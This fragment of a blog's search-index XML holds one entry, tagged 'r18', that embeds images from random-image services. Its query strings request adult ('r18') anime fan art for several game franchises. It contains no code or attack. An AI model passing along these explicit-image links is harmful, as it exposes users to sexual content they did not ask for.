    <content type="html"><![CDATA[<p><img src="https://moe.jitsu.top/r18" alt="image"></p><p><img src="https://moe.jitsu.top/img/?sort=r18" alt="image"></p><p><img src="https://image.anosu.top/pixiv/direct?r18=1&keyword=azurlane"></p><p><img src="https://image.anosu.top/pixiv/direct?r18=1&keyword=bluearchive"></p><p><img src="https://image.anosu.top/pixiv/direct?r18=1&keyword=hololive"></p><p><img src="https://image.anosu.top/pixiv/direct?r18=1&keyword=touhou"></p><p><img src="https://image.anosu.top/pixiv/direct?r18=1&keyword=frontline"></p><p><img src="https://moe.jitsu.top/img/?sort=r18"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>r18</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
